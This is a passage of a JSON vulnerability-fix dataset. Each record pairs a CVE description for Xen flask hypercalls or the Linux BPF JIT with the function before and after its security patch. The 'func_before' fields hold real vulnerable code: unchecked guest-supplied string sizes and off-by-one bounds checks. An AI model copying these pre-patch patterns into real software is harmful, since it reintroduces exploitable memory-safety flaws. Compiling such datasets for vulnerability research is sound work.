        "description": "Multiple integer overflows in the (1) FLASK_GETBOOL, (2) FLASK_SETBOOL, (3) FLASK_USER, and (4) FLASK_CONTEXT_TO_SID suboperations in the flask hypercall in Xen 4.3.x, 4.2.x, 4.1.x, 3.2.x, and earlier, when XSM is enabled, allow local users to cause a denial of service (processor fault) via unspecified vectors, a different vulnerability than CVE-2014-1892, CVE-2014-1893, and CVE-2014-1894.",
        "git_url": "https://github.com/xen-project/xen/commit/6c79e0ab9ac6042e60434c02e1d99b0cf0cc3470",
        "commit_title": "flask: fix reading strings from guest memory",
        "commit_text": " Since the string size is being specified by the guest, we must range check it properly before doing allocations based on it. While for the two cases that are exposed only to trusted guests (via policy restriction) this just uses an arbitrary upper limit (PAGE_SIZE), for the FLASK_[GS]ETBOOL case (which any guest can use) the upper limit gets enforced based on the longest name across all boolean settings.  This is XSA-84. ",
        "func_before": "static int flask_security_resolve_bool(struct xen_flask_boolean *arg)\n{\n    char *name;\n    int rv;\n\n    if ( arg->bool_id != -1 )\n        return 0;\n\n    rv = flask_copyin_string(arg->name, &name, arg->size);\n    if ( rv )\n        return rv;\n\n    arg->bool_id = security_find_bool(name);\n    arg->size = 0;\n\n    xfree(name);\n\n    return 0;\n}",
        "func": "static int flask_security_resolve_bool(struct xen_flask_boolean *arg)\n{\n    char *name;\n    int rv;\n\n    if ( arg->bool_id != -1 )\n        return 0;\n\n    rv = flask_copyin_string(arg->name, &name, arg->size, bool_maxstr);\n    if ( rv )\n        return rv;\n\n    arg->bool_id = security_find_bool(name);\n    arg->size = 0;\n\n    xfree(name);\n\n    return 0;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -6,7 +6,7 @@\n     if ( arg->bool_id != -1 )\n         return 0;\n \n-    rv = flask_copyin_string(arg->name, &name, arg->size);\n+    rv = flask_copyin_string(arg->name, &name, arg->size, bool_maxstr);\n     if ( rv )\n         return rv;\n ",
        "diff_line_info": {
            "deleted_lines": [
                "    rv = flask_copyin_string(arg->name, &name, arg->size);"
            ],
            "added_lines": [
                "    rv = flask_copyin_string(arg->name, &name, arg->size, bool_maxstr);"
            ]
        }
    },
    {
        "cve_id": "CVE-2014-1891",
        "func_name": "xen-project/xen/flask_copyin_string",
        "description": "Multiple integer overflows in the (1) FLASK_GETBOOL, (2) FLASK_SETBOOL, (3) FLASK_USER, and (4) FLASK_CONTEXT_TO_SID suboperations in the flask hypercall in Xen 4.3.x, 4.2.x, 4.1.x, 3.2.x, and earlier, when XSM is enabled, allow local users to cause a denial of service (processor fault) via unspecified vectors, a different vulnerability than CVE-2014-1892, CVE-2014-1893, and CVE-2014-1894.",
        "git_url": "https://github.com/xen-project/xen/commit/6c79e0ab9ac6042e60434c02e1d99b0cf0cc3470",
        "commit_title": "flask: fix reading strings from guest memory",
        "commit_text": " Since the string size is being specified by the guest, we must range check it properly before doing allocations based on it. While for the two cases that are exposed only to trusted guests (via policy restriction) this just uses an arbitrary upper limit (PAGE_SIZE), for the FLASK_[GS]ETBOOL case (which any guest can use) the upper limit gets enforced based on the longest name across all boolean settings.  This is XSA-84. ",
        "func_before": "static int flask_copyin_string(XEN_GUEST_HANDLE_PARAM(char) u_buf, char **buf, uint32_t size)\n{\n    char *tmp = xmalloc_bytes(size + 1);\n    if ( !tmp )\n        return -ENOMEM;\n\n    if ( copy_from_guest(tmp, u_buf, size) )\n    {\n        xfree(tmp);\n        return -EFAULT;\n    }\n    tmp[size] = 0;\n\n    *buf = tmp;\n    return 0;\n}",
        "func": "static int flask_copyin_string(XEN_GUEST_HANDLE_PARAM(char) u_buf, char **buf,\n                               size_t size, size_t max_size)\n{\n    char *tmp;\n\n    if ( size > max_size )\n        return -ENOENT;\n\n    tmp = xmalloc_array(char, size + 1);\n    if ( !tmp )\n        return -ENOMEM;\n\n    if ( copy_from_guest(tmp, u_buf, size) )\n    {\n        xfree(tmp);\n        return -EFAULT;\n    }\n    tmp[size] = 0;\n\n    *buf = tmp;\n    return 0;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -1,6 +1,12 @@\n-static int flask_copyin_string(XEN_GUEST_HANDLE_PARAM(char) u_buf, char **buf, uint32_t size)\n+static int flask_copyin_string(XEN_GUEST_HANDLE_PARAM(char) u_buf, char **buf,\n+                               size_t size, size_t max_size)\n {\n-    char *tmp = xmalloc_bytes(size + 1);\n+    char *tmp;\n+\n+    if ( size > max_size )\n+        return -ENOENT;\n+\n+    tmp = xmalloc_array(char, size + 1);\n     if ( !tmp )\n         return -ENOMEM;\n ",
        "diff_line_info": {
            "deleted_lines": [
                "static int flask_copyin_string(XEN_GUEST_HANDLE_PARAM(char) u_buf, char **buf, uint32_t size)",
                "    char *tmp = xmalloc_bytes(size + 1);"
            ],
            "added_lines": [
                "static int flask_copyin_string(XEN_GUEST_HANDLE_PARAM(char) u_buf, char **buf,",
                "                               size_t size, size_t max_size)",
                "    char *tmp;",
                "",
                "    if ( size > max_size )",
                "        return -ENOENT;",
                "",
                "    tmp = xmalloc_array(char, size + 1);"
            ]
        }
    },
    {
        "cve_id": "CVE-2014-1891",
        "func_name": "xen-project/xen/flask_security_context",
        "description": "Multiple integer overflows in the (1) FLASK_GETBOOL, (2) FLASK_SETBOOL, (3) FLASK_USER, and (4) FLASK_CONTEXT_TO_SID suboperations in the flask hypercall in Xen 4.3.x, 4.2.x, 4.1.x, 3.2.x, and earlier, when XSM is enabled, allow local users to cause a denial of service (processor fault) via unspecified vectors, a different vulnerability than CVE-2014-1892, CVE-2014-1893, and CVE-2014-1894.",
        "git_url": "https://github.com/xen-project/xen/commit/6c79e0ab9ac6042e60434c02e1d99b0cf0cc3470",
        "commit_title": "flask: fix reading strings from guest memory",
        "commit_text": " Since the string size is being specified by the guest, we must range check it properly before doing allocations based on it. While for the two cases that are exposed only to trusted guests (via policy restriction) this just uses an arbitrary upper limit (PAGE_SIZE), for the FLASK_[GS]ETBOOL case (which any guest can use) the upper limit gets enforced based on the longest name across all boolean settings.  This is XSA-84. ",
        "func_before": "static int flask_security_context(struct xen_flask_sid_context *arg)\n{\n    int rv;\n    char *buf;\n\n    rv = domain_has_security(current->domain, SECURITY__CHECK_CONTEXT);\n    if ( rv )\n        return rv;\n\n    rv = flask_copyin_string(arg->context, &buf, arg->size);\n    if ( rv )\n        return rv;\n\n    rv = security_context_to_sid(buf, arg->size, &arg->sid);\n    if ( rv < 0 )\n        goto out;\n\n out:\n    xfree(buf);\n\n    return rv;\n}",
        "func": "static int flask_security_context(struct xen_flask_sid_context *arg)\n{\n    int rv;\n    char *buf;\n\n    rv = domain_has_security(current->domain, SECURITY__CHECK_CONTEXT);\n    if ( rv )\n        return rv;\n\n    rv = flask_copyin_string(arg->context, &buf, arg->size, PAGE_SIZE);\n    if ( rv )\n        return rv;\n\n    rv = security_context_to_sid(buf, arg->size, &arg->sid);\n    if ( rv < 0 )\n        goto out;\n\n out:\n    xfree(buf);\n\n    return rv;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -7,7 +7,7 @@\n     if ( rv )\n         return rv;\n \n-    rv = flask_copyin_string(arg->context, &buf, arg->size);\n+    rv = flask_copyin_string(arg->context, &buf, arg->size, PAGE_SIZE);\n     if ( rv )\n         return rv;\n ",
        "diff_line_info": {
            "deleted_lines": [
                "    rv = flask_copyin_string(arg->context, &buf, arg->size);"
            ],
            "added_lines": [
                "    rv = flask_copyin_string(arg->context, &buf, arg->size, PAGE_SIZE);"
            ]
        }
    },
    {
        "cve_id": "CVE-2014-1891",
        "func_name": "xen-project/xen/flask_security_make_bools",
        "description": "Multiple integer overflows in the (1) FLASK_GETBOOL, (2) FLASK_SETBOOL, (3) FLASK_USER, and (4) FLASK_CONTEXT_TO_SID suboperations in the flask hypercall in Xen 4.3.x, 4.2.x, 4.1.x, 3.2.x, and earlier, when XSM is enabled, allow local users to cause a denial of service (processor fault) via unspecified vectors, a different vulnerability than CVE-2014-1892, CVE-2014-1893, and CVE-2014-1894.",
        "git_url": "https://github.com/xen-project/xen/commit/6c79e0ab9ac6042e60434c02e1d99b0cf0cc3470",
        "commit_title": "flask: fix reading strings from guest memory",
        "commit_text": " Since the string size is being specified by the guest, we must range check it properly before doing allocations based on it. While for the two cases that are exposed only to trusted guests (via policy restriction) this just uses an arbitrary upper limit (PAGE_SIZE), for the FLASK_[GS]ETBOOL case (which any guest can use) the upper limit gets enforced based on the longest name across all boolean settings.  This is XSA-84. ",
        "func_before": "static int flask_security_make_bools(void)\n{\n    int ret = 0;\n    int num;\n    int *values = NULL;\n    \n    xfree(bool_pending_values);\n    \n    ret = security_get_bools(&num, NULL, &values);\n    if ( ret != 0 )\n        goto out;\n\n    bool_num = num;\n    bool_pending_values = values;\n\n out:\n    return ret;\n}",
        "func": "static int flask_security_make_bools(void)\n{\n    int ret = 0;\n    int num;\n    int *values = NULL;\n    \n    xfree(bool_pending_values);\n    \n    ret = security_get_bools(&num, NULL, &values, &bool_maxstr);\n    if ( ret != 0 )\n        goto out;\n\n    bool_num = num;\n    bool_pending_values = values;\n\n out:\n    return ret;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -6,7 +6,7 @@\n     \n     xfree(bool_pending_values);\n     \n-    ret = security_get_bools(&num, NULL, &values);\n+    ret = security_get_bools(&num, NULL, &values, &bool_maxstr);\n     if ( ret != 0 )\n         goto out;\n ",
        "diff_line_info": {
            "deleted_lines": [
                "    ret = security_get_bools(&num, NULL, &values);"
            ],
            "added_lines": [
                "    ret = security_get_bools(&num, NULL, &values, &bool_maxstr);"
            ]
        }
    },
    {
        "cve_id": "CVE-2014-1891",
        "func_name": "xen-project/xen/flask_security_user",
        "description": "Multiple integer overflows in the (1) FLASK_GETBOOL, (2) FLASK_SETBOOL, (3) FLASK_USER, and (4) FLASK_CONTEXT_TO_SID suboperations in the flask hypercall in Xen 4.3.x, 4.2.x, 4.1.x, 3.2.x, and earlier, when XSM is enabled, allow local users to cause a denial of service (processor fault) via unspecified vectors, a different vulnerability than CVE-2014-1892, CVE-2014-1893, and CVE-2014-1894.",
        "git_url": "https://github.com/xen-project/xen/commit/6c79e0ab9ac6042e60434c02e1d99b0cf0cc3470",
        "commit_title": "flask: fix reading strings from guest memory",
        "commit_text": " Since the string size is being specified by the guest, we must range check it properly before doing allocations based on it. While for the two cases that are exposed only to trusted guests (via policy restriction) this just uses an arbitrary upper limit (PAGE_SIZE), for the FLASK_[GS]ETBOOL case (which any guest can use) the upper limit gets enforced based on the longest name across all boolean settings.  This is XSA-84. ",
        "func_before": "static int flask_security_user(struct xen_flask_userlist *arg)\n{\n    char *user;\n    u32 *sids;\n    u32 nsids;\n    int rv;\n\n    rv = domain_has_security(current->domain, SECURITY__COMPUTE_USER);\n    if ( rv )\n        return rv;\n\n    rv = flask_copyin_string(arg->u.user, &user, arg->size);\n    if ( rv )\n        return rv;\n\n    rv = security_get_user_sids(arg->start_sid, user, &sids, &nsids);\n    if ( rv < 0 )\n        goto out;\n\n    if ( nsids * sizeof(sids[0]) > arg->size )\n        nsids = arg->size / sizeof(sids[0]);\n\n    arg->size = nsids;\n\n    if ( copy_to_guest(arg->u.sids, sids, nsids) )\n        rv = -EFAULT;\n\n    xfree(sids);\n out:\n    xfree(user);\n    return rv;\n}",
        "func": "static int flask_security_user(struct xen_flask_userlist *arg)\n{\n    char *user;\n    u32 *sids;\n    u32 nsids;\n    int rv;\n\n    rv = domain_has_security(current->domain, SECURITY__COMPUTE_USER);\n    if ( rv )\n        return rv;\n\n    rv = flask_copyin_string(arg->u.user, &user, arg->size, PAGE_SIZE);\n    if ( rv )\n        return rv;\n\n    rv = security_get_user_sids(arg->start_sid, user, &sids, &nsids);\n    if ( rv < 0 )\n        goto out;\n\n    if ( nsids * sizeof(sids[0]) > arg->size )\n        nsids = arg->size / sizeof(sids[0]);\n\n    arg->size = nsids;\n\n    if ( copy_to_guest(arg->u.sids, sids, nsids) )\n        rv = -EFAULT;\n\n    xfree(sids);\n out:\n    xfree(user);\n    return rv;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -9,7 +9,7 @@\n     if ( rv )\n         return rv;\n \n-    rv = flask_copyin_string(arg->u.user, &user, arg->size);\n+    rv = flask_copyin_string(arg->u.user, &user, arg->size, PAGE_SIZE);\n     if ( rv )\n         return rv;\n ",
        "diff_line_info": {
            "deleted_lines": [
                "    rv = flask_copyin_string(arg->u.user, &user, arg->size);"
            ],
            "added_lines": [
                "    rv = flask_copyin_string(arg->u.user, &user, arg->size, PAGE_SIZE);"
            ]
        }
    },
    {
        "cve_id": "CVE-2014-1891",
        "func_name": "xen-project/xen/security_get_bools",
        "description": "Multiple integer overflows in the (1) FLASK_GETBOOL, (2) FLASK_SETBOOL, (3) FLASK_USER, and (4) FLASK_CONTEXT_TO_SID suboperations in the flask hypercall in Xen 4.3.x, 4.2.x, 4.1.x, 3.2.x, and earlier, when XSM is enabled, allow local users to cause a denial of service (processor fault) via unspecified vectors, a different vulnerability than CVE-2014-1892, CVE-2014-1893, and CVE-2014-1894.",
        "git_url": "https://github.com/xen-project/xen/commit/6c79e0ab9ac6042e60434c02e1d99b0cf0cc3470",
        "commit_title": "flask: fix reading strings from guest memory",
        "commit_text": " Since the string size is being specified by the guest, we must range check it properly before doing allocations based on it. While for the two cases that are exposed only to trusted guests (via policy restriction) this just uses an arbitrary upper limit (PAGE_SIZE), for the FLASK_[GS]ETBOOL case (which any guest can use) the upper limit gets enforced based on the longest name across all boolean settings.  This is XSA-84. ",
        "func_before": "int security_get_bools(int *len, char ***names, int **values)\n{\n    int i, rc = -ENOMEM;\n\n    POLICY_RDLOCK;\n    if ( names )\n        *names = NULL;\n    *values = NULL;\n\n    *len = policydb.p_bools.nprim;\n    if ( !*len )\n    {\n        rc = 0;\n        goto out;\n    }\n\n    if ( names ) {\n        *names = (char**)xmalloc_array(char*, *len);\n        if ( !*names )\n            goto err;\n        memset(*names, 0, sizeof(char*) * *len);\n    }\n\n    *values = (int*)xmalloc_array(int, *len);\n    if ( !*values )\n        goto err;\n\n    for ( i = 0; i < *len; i++ )\n    {\n        size_t name_len;\n        (*values)[i] = policydb.bool_val_to_struct[i]->state;\n        if ( names ) {\n            name_len = strlen(policydb.p_bool_val_to_name[i]) + 1;\n            (*names)[i] = (char*)xmalloc_array(char, name_len);\n            if ( !(*names)[i] )\n                goto err;\n            strlcpy((*names)[i], policydb.p_bool_val_to_name[i], name_len);\n            (*names)[i][name_len - 1] = 0;\n        }\n    }\n    rc = 0;\nout:\n    POLICY_RDUNLOCK;\n    return rc;\nerr:\n    if ( names && *names )\n    {\n        for ( i = 0; i < *len; i++ )\n            xfree((*names)[i]);\n    }\n    xfree(*values);\n    goto out;\n}",
        "func": "int security_get_bools(int *len, char ***names, int **values, size_t *maxstr)\n{\n    int i, rc = -ENOMEM;\n\n    POLICY_RDLOCK;\n    if ( names )\n        *names = NULL;\n    *values = NULL;\n    if ( maxstr )\n        *maxstr = 0;\n\n    *len = policydb.p_bools.nprim;\n    if ( !*len )\n    {\n        rc = 0;\n        goto out;\n    }\n\n    if ( names ) {\n        *names = (char**)xmalloc_array(char*, *len);\n        if ( !*names )\n            goto err;\n        memset(*names, 0, sizeof(char*) * *len);\n    }\n\n    *values = (int*)xmalloc_array(int, *len);\n    if ( !*values )\n        goto err;\n\n    for ( i = 0; i < *len; i++ )\n    {\n        size_t name_len = strlen(policydb.p_bool_val_to_name[i]);\n\n        (*values)[i] = policydb.bool_val_to_struct[i]->state;\n        if ( names ) {\n            (*names)[i] = xmalloc_array(char, name_len + 1);\n            if ( !(*names)[i] )\n                goto err;\n            strlcpy((*names)[i], policydb.p_bool_val_to_name[i], name_len + 1);\n        }\n        if ( maxstr && name_len > *maxstr )\n            *maxstr = name_len;\n    }\n    rc = 0;\nout:\n    POLICY_RDUNLOCK;\n    return rc;\nerr:\n    if ( names && *names )\n    {\n        for ( i = 0; i < *len; i++ )\n            xfree((*names)[i]);\n    }\n    xfree(*values);\n    goto out;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -1,4 +1,4 @@\n-int security_get_bools(int *len, char ***names, int **values)\n+int security_get_bools(int *len, char ***names, int **values, size_t *maxstr)\n {\n     int i, rc = -ENOMEM;\n \n@@ -6,6 +6,8 @@\n     if ( names )\n         *names = NULL;\n     *values = NULL;\n+    if ( maxstr )\n+        *maxstr = 0;\n \n     *len = policydb.p_bools.nprim;\n     if ( !*len )\n@@ -27,16 +29,17 @@\n \n     for ( i = 0; i < *len; i++ )\n     {\n-        size_t name_len;\n+        size_t name_len = strlen(policydb.p_bool_val_to_name[i]);\n+\n         (*values)[i] = policydb.bool_val_to_struct[i]->state;\n         if ( names ) {\n-            name_len = strlen(policydb.p_bool_val_to_name[i]) + 1;\n-            (*names)[i] = (char*)xmalloc_array(char, name_len);\n+            (*names)[i] = xmalloc_array(char, name_len + 1);\n             if ( !(*names)[i] )\n                 goto err;\n-            strlcpy((*names)[i], policydb.p_bool_val_to_name[i], name_len);\n-            (*names)[i][name_len - 1] = 0;\n+            strlcpy((*names)[i], policydb.p_bool_val_to_name[i], name_len + 1);\n         }\n+        if ( maxstr && name_len > *maxstr )\n+            *maxstr = name_len;\n     }\n     rc = 0;\n out:",
        "diff_line_info": {
            "deleted_lines": [
                "int security_get_bools(int *len, char ***names, int **values)",
                "        size_t name_len;",
                "            name_len = strlen(policydb.p_bool_val_to_name[i]) + 1;",
                "            (*names)[i] = (char*)xmalloc_array(char, name_len);",
                "            strlcpy((*names)[i], policydb.p_bool_val_to_name[i], name_len);",
                "            (*names)[i][name_len - 1] = 0;"
            ],
            "added_lines": [
                "int security_get_bools(int *len, char ***names, int **values, size_t *maxstr)",
                "    if ( maxstr )",
                "        *maxstr = 0;",
                "        size_t name_len = strlen(policydb.p_bool_val_to_name[i]);",
                "",
                "            (*names)[i] = xmalloc_array(char, name_len + 1);",
                "            strlcpy((*names)[i], policydb.p_bool_val_to_name[i], name_len + 1);",
                "        if ( maxstr && name_len > *maxstr )",
                "            *maxstr = name_len;"
            ]
        }
    },
    {
        "cve_id": "CVE-2014-1891",
        "func_name": "xen-project/xen/security_preserve_bools",
        "description": "Multiple integer overflows in the (1) FLASK_GETBOOL, (2) FLASK_SETBOOL, (3) FLASK_USER, and (4) FLASK_CONTEXT_TO_SID suboperations in the flask hypercall in Xen 4.3.x, 4.2.x, 4.1.x, 3.2.x, and earlier, when XSM is enabled, allow local users to cause a denial of service (processor fault) via unspecified vectors, a different vulnerability than CVE-2014-1892, CVE-2014-1893, and CVE-2014-1894.",
        "git_url": "https://github.com/xen-project/xen/commit/6c79e0ab9ac6042e60434c02e1d99b0cf0cc3470",
        "commit_title": "flask: fix reading strings from guest memory",
        "commit_text": " Since the string size is being specified by the guest, we must range check it properly before doing allocations based on it. While for the two cases that are exposed only to trusted guests (via policy restriction) this just uses an arbitrary upper limit (PAGE_SIZE), for the FLASK_[GS]ETBOOL case (which any guest can use) the upper limit gets enforced based on the longest name across all boolean settings.  This is XSA-84. ",
        "func_before": "static int security_preserve_bools(struct policydb *p)\n{\n    int rc, nbools = 0, *bvalues = NULL, i;\n    char **bnames = NULL;\n    struct cond_bool_datum *booldatum;\n    struct cond_node *cur;\n\n    rc = security_get_bools(&nbools, &bnames, &bvalues);\n    if ( rc )\n        goto out;\n    for ( i = 0; i < nbools; i++ )\n    {\n        booldatum = hashtab_search(p->p_bools.table, bnames[i]);\n        if ( booldatum )\n            booldatum->state = bvalues[i];\n    }\n    for ( cur = p->cond_list; cur; cur = cur->next )\n    {\n        rc = evaluate_cond_node(p, cur);\n        if ( rc )\n            goto out;\n    }\n\nout:\n    if ( bnames )\n    {\n        for ( i = 0; i < nbools; i++ )\n            xfree(bnames[i]);\n    }\n    xfree(bnames);\n    xfree(bvalues);\n    return rc;\n}",
        "func": "static int security_preserve_bools(struct policydb *p)\n{\n    int rc, nbools = 0, *bvalues = NULL, i;\n    char **bnames = NULL;\n    struct cond_bool_datum *booldatum;\n    struct cond_node *cur;\n\n    rc = security_get_bools(&nbools, &bnames, &bvalues, NULL);\n    if ( rc )\n        goto out;\n    for ( i = 0; i < nbools; i++ )\n    {\n        booldatum = hashtab_search(p->p_bools.table, bnames[i]);\n        if ( booldatum )\n            booldatum->state = bvalues[i];\n    }\n    for ( cur = p->cond_list; cur; cur = cur->next )\n    {\n        rc = evaluate_cond_node(p, cur);\n        if ( rc )\n            goto out;\n    }\n\nout:\n    if ( bnames )\n    {\n        for ( i = 0; i < nbools; i++ )\n            xfree(bnames[i]);\n    }\n    xfree(bnames);\n    xfree(bvalues);\n    return rc;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -5,7 +5,7 @@\n     struct cond_bool_datum *booldatum;\n     struct cond_node *cur;\n \n-    rc = security_get_bools(&nbools, &bnames, &bvalues);\n+    rc = security_get_bools(&nbools, &bnames, &bvalues, NULL);\n     if ( rc )\n         goto out;\n     for ( i = 0; i < nbools; i++ )",
        "diff_line_info": {
            "deleted_lines": [
                "    rc = security_get_bools(&nbools, &bnames, &bvalues);"
            ],
            "added_lines": [
                "    rc = security_get_bools(&nbools, &bnames, &bvalues, NULL);"
            ]
        }
    },
    {
        "cve_id": "CVE-2014-1895",
        "func_name": "xen-project/xen/flask_security_avc_cachestats",
        "description": "Off-by-one error in the flask_security_avc_cachestats function in xsm/flask/flask_op.c in Xen 4.2.x and 4.3.x, when the maximum number of physical CPUs are in use, allows local users to cause a denial of service (host crash) or obtain sensitive information from hypervisor memory by leveraging a FLASK_AVC_CACHESTAT hypercall, which triggers a buffer over-read.",
        "git_url": "https://github.com/xen-project/xen/commit/2e1cba2da4631c5cd7218a8f30d521dce0f41370",
        "commit_title": "xsm/flask: correct off-by-one in flask_security_avc_cachestats cpu id check",
        "commit_text": " This is XSA-85. ",
        "func_before": "static int flask_security_avc_cachestats(struct xen_flask_cache_stats *arg)\n{\n    struct avc_cache_stats *st;\n\n    if ( arg->cpu > nr_cpu_ids )\n        return -ENOENT;\n    if ( !cpu_online(arg->cpu) )\n        return -ENOENT;\n\n    st = &per_cpu(avc_cache_stats, arg->cpu);\n\n    arg->lookups = st->lookups;\n    arg->hits = st->hits;\n    arg->misses = st->misses;\n    arg->allocations = st->allocations;\n    arg->reclaims = st->reclaims;\n    arg->frees = st->frees;\n\n    return 0;\n}",
        "func": "static int flask_security_avc_cachestats(struct xen_flask_cache_stats *arg)\n{\n    struct avc_cache_stats *st;\n\n    if ( arg->cpu >= nr_cpu_ids )\n        return -ENOENT;\n    if ( !cpu_online(arg->cpu) )\n        return -ENOENT;\n\n    st = &per_cpu(avc_cache_stats, arg->cpu);\n\n    arg->lookups = st->lookups;\n    arg->hits = st->hits;\n    arg->misses = st->misses;\n    arg->allocations = st->allocations;\n    arg->reclaims = st->reclaims;\n    arg->frees = st->frees;\n\n    return 0;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -2,7 +2,7 @@\n {\n     struct avc_cache_stats *st;\n \n-    if ( arg->cpu > nr_cpu_ids )\n+    if ( arg->cpu >= nr_cpu_ids )\n         return -ENOENT;\n     if ( !cpu_online(arg->cpu) )\n         return -ENOENT;",
        "diff_line_info": {
            "deleted_lines": [
                "    if ( arg->cpu > nr_cpu_ids )"
            ],
            "added_lines": [
                "    if ( arg->cpu >= nr_cpu_ids )"
            ]
        }
    },
    {
        "cve_id": "CVE-2014-2889",
        "func_name": "torvalds/linux/bpf_jit_compile",
        "description": "Off-by-one error in the bpf_jit_compile function in arch/x86/net/bpf_jit_comp.c in the Linux kernel before 3.1.8, when BPF JIT is enabled, allows local users to cause a denial of service (system crash) or possibly gain privileges via a long jump after a conditional jump.",
        "git_url": "https://github.com/torvalds/linux/commit/a03ffcf873fe0f2565386ca8ef832144c42e67fa",
        "commit_title": "net: bpf_jit: fix an off-one bug in x86_64 cond jump target",
        "commit_text": " x86 jump instruction size is 2 or 5 bytes (near/long jump), not 2 or 6 bytes.  In case a conditional jump is followed by a long jump, conditional jump target is one byte past the start of target instruction. ",
        "func_before": "void bpf_jit_compile(struct sk_filter *fp)\n{\n\tu8 temp[64];\n\tu8 *prog;\n\tunsigned int proglen, oldproglen = 0;\n\tint ilen, i;\n\tint t_offset, f_offset;\n\tu8 t_op, f_op, seen = 0, pass;\n\tu8 *image = NULL;\n\tu8 *func;\n\tint pc_ret0 = -1; /* bpf index of first RET #0 instruction (if any) */\n\tunsigned int cleanup_addr; /* epilogue code offset */\n\tunsigned int *addrs;\n\tconst struct sock_filter *filter = fp->insns;\n\tint flen = fp->len;\n\n\tif (!bpf_jit_enable)\n\t\treturn;\n\n\taddrs = kmalloc(flen * sizeof(*addrs), GFP_KERNEL);\n\tif (addrs == NULL)\n\t\treturn;\n\n\t/* Before first pass, make a rough estimation of addrs[]\n\t * each bpf instruction is translated to less than 64 bytes\n\t */\n\tfor (proglen = 0, i = 0; i < flen; i++) {\n\t\tproglen += 64;\n\t\taddrs[i] = proglen;\n\t}\n\tcleanup_addr = proglen; /* epilogue address */\n\n\tfor (pass = 0; pass < 10; pass++) {\n\t\t/* no prologue/epilogue for trivial filters (RET something) */\n\t\tproglen = 0;\n\t\tprog = temp;\n\n\t\tif (seen) {\n\t\t\tEMIT4(0x55, 0x48, 0x89, 0xe5); /* push %rbp; mov %rsp,%rbp */\n\t\t\tEMIT4(0x48, 0x83, 0xec, 96);\t/* subq  $96,%rsp\t*/\n\t\t\t/* note : must save %rbx in case bpf_error is hit */\n\t\t\tif (seen & (SEEN_XREG | SEEN_DATAREF))\n\t\t\t\tEMIT4(0x48, 0x89, 0x5d, 0xf8); /* mov %rbx, -8(%rbp) */\n\t\t\tif (seen & SEEN_XREG)\n\t\t\t\tCLEAR_X(); /* make sure we dont leek kernel memory */\n\n\t\t\t/*\n\t\t\t * If this filter needs to access skb data,\n\t\t\t * loads r9 and r8 with :\n\t\t\t *  r9 = skb->len - skb->data_len\n\t\t\t *  r8 = skb->data\n\t\t\t */\n\t\t\tif (seen & SEEN_DATAREF) {\n\t\t\t\tif (offsetof(struct sk_buff, len) <= 127)\n\t\t\t\t\t/* mov    off8(%rdi),%r9d */\n\t\t\t\t\tEMIT4(0x44, 0x8b, 0x4f, offsetof(struct sk_buff, len));\n\t\t\t\telse {\n\t\t\t\t\t/* mov    off32(%rdi),%r9d */\n\t\t\t\t\tEMIT3(0x44, 0x8b, 0x8f);\n\t\t\t\t\tEMIT(offsetof(struct sk_buff, len), 4);\n\t\t\t\t}\n\t\t\t\tif (is_imm8(offsetof(struct sk_buff, data_len)))\n\t\t\t\t\t/* sub    off8(%rdi),%r9d */\n\t\t\t\t\tEMIT4(0x44, 0x2b, 0x4f, offsetof(struct sk_buff, data_len));\n\t\t\t\telse {\n\t\t\t\t\tEMIT3(0x44, 0x2b, 0x8f);\n\t\t\t\t\tEMIT(offsetof(struct sk_buff, data_len), 4);\n\t\t\t\t}\n\n\t\t\t\tif (is_imm8(offsetof(struct sk_buff, data)))\n\t\t\t\t\t/* mov off8(%rdi),%r8 */\n\t\t\t\t\tEMIT4(0x4c, 0x8b, 0x47, offsetof(struct sk_buff, data));\n\t\t\t\telse {\n\t\t\t\t\t/* mov off32(%rdi),%r8 */\n\t\t\t\t\tEMIT3(0x4c, 0x8b, 0x87);\n\t\t\t\t\tEMIT(offsetof(struct sk_buff, data), 4);\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\tswitch (filter[0].code) {\n\t\tcase BPF_S_RET_K:\n\t\tcase BPF_S_LD_W_LEN:\n\t\tcase BPF_S_ANC_PROTOCOL:\n\t\tcase BPF_S_ANC_IFINDEX:\n\t\tcase BPF_S_ANC_MARK:\n\t\tcase BPF_S_ANC_RXHASH:\n\t\tcase BPF_S_ANC_CPU:\n\t\tcase BPF_S_ANC_QUEUE:\n\t\tcase BPF_S_LD_W_ABS:\n\t\tcase BPF_S_LD_H_ABS:\n\t\tcase BPF_S_LD_B_ABS:\n\t\t\t/* first instruction sets A register (or is RET 'constant') */\n\t\t\tbreak;\n\t\tdefault:\n\t\t\t/* make sure we dont leak kernel information to user */\n\t\t\tCLEAR_A(); /* A = 0 */\n\t\t}\n\n\t\tfor (i = 0; i < flen; i++) {\n\t\t\tunsigned int K = filter[i].k;\n\n\t\t\tswitch (filter[i].code) {\n\t\t\tcase BPF_S_ALU_ADD_X: /* A += X; */\n\t\t\t\tseen |= SEEN_XREG;\n\t\t\t\tEMIT2(0x01, 0xd8);\t\t/* add %ebx,%eax */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ALU_ADD_K: /* A += K; */\n\t\t\t\tif (!K)\n\t\t\t\t\tbreak;\n\t\t\t\tif (is_imm8(K))\n\t\t\t\t\tEMIT3(0x83, 0xc0, K);\t/* add imm8,%eax */\n\t\t\t\telse\n\t\t\t\t\tEMIT1_off32(0x05, K);\t/* add imm32,%eax */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ALU_SUB_X: /* A -= X; */\n\t\t\t\tseen |= SEEN_XREG;\n\t\t\t\tEMIT2(0x29, 0xd8);\t\t/* sub    %ebx,%eax */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ALU_SUB_K: /* A -= K */\n\t\t\t\tif (!K)\n\t\t\t\t\tbreak;\n\t\t\t\tif (is_imm8(K))\n\t\t\t\t\tEMIT3(0x83, 0xe8, K); /* sub imm8,%eax */\n\t\t\t\telse\n\t\t\t\t\tEMIT1_off32(0x2d, K); /* sub imm32,%eax */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ALU_MUL_X: /* A *= X; */\n\t\t\t\tseen |= SEEN_XREG;\n\t\t\t\tEMIT3(0x0f, 0xaf, 0xc3);\t/* imul %ebx,%eax */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ALU_MUL_K: 